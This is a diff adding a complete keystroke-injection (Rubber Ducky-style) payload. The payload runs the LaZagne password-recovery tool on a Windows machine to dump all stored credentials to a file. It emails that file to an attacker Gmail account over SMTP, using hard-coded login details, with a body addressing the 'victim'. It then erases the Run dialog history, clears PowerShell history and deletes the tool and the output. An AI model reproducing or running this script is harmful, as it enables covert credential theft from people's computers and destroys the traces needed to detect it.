@@ -1,0 +1,146 @@
+DELAY 1000
+
+GUI r
+
+DELAY 800
+
+STRING cmd
+
+DELAY 800
+
+ENTER
+
+DELAY 800
+
+STRING cd Downloads
+DELAY 100
+ENTER
+STRING laZagne_x64.exe all > win32.txt
+
+DELAY 2000
+
+ENTER
+
+STRING powershell
+
+ENTER
+
+DELAY 800
+
+STRING $SMTPServer = 'smtp.gmail.com'
+
+ENTER
+
+DELAY 800
+
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+
+ENTER
+
+DELAY 800
+
+STRING $SMTPInfo.EnableSsl = $true
+
+ENTER
+
+DELAY 800
+
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logdem1234@gmail.com', 'keylogs987654321')
+
+ENTER 
+
+DELAY 1000
+
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+
+ENTER
+
+DELAY 800
+
+STRING $ReportEmail.From = 'logdem1234@gmail.com'
+
+ENTER
+
+DELAY 800
+
+STRING $ReportEmail.To.Add('logdem1234@gmail.com')
+
+ENTER
+
+DELAY 800
+
+STRING $ReportEmail.Subject = 'Pass Report of ' + $env:UserName
+
+ENTER 
+
+DELAY 800
+
+STRING $ReportEmail.Body = 'Attached is your victim WIFI Passwords'
+
+ENTER 
+
+DELAY 800
+
+STRING $ReportEmail.Attachments.Add('.\win32.txt')
+
+ENTER
+
+DELAY 1000
+
+STRING $SMTPInfo.Send($ReportEmail)
+
+ENTER
+
+DELAY 4000
+
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+
+ENTER
+
+DELAY 800
+
+STRING Clear-History
+
+ENTER
+
+DELAY 800
+
+STRING Clear-History
+
+ENTER
+
+DELAY 800
+
+STRING Clear-History
+
+ENTER
+
+DELAY 800
+
+STRING Clear-History
+
+ENTER
+
+DELAY 800
+
+STRING Clear-History
+
+ENTER
+
+DELAY 800
+
+STRING exit
+
+ENTER
+
+DELAY 800
+
+STRING del laZagne_x64.exe && del win32.txt
+
+ENTER
+
+DELAY 800
+
+STRING exit
+
+ENTER
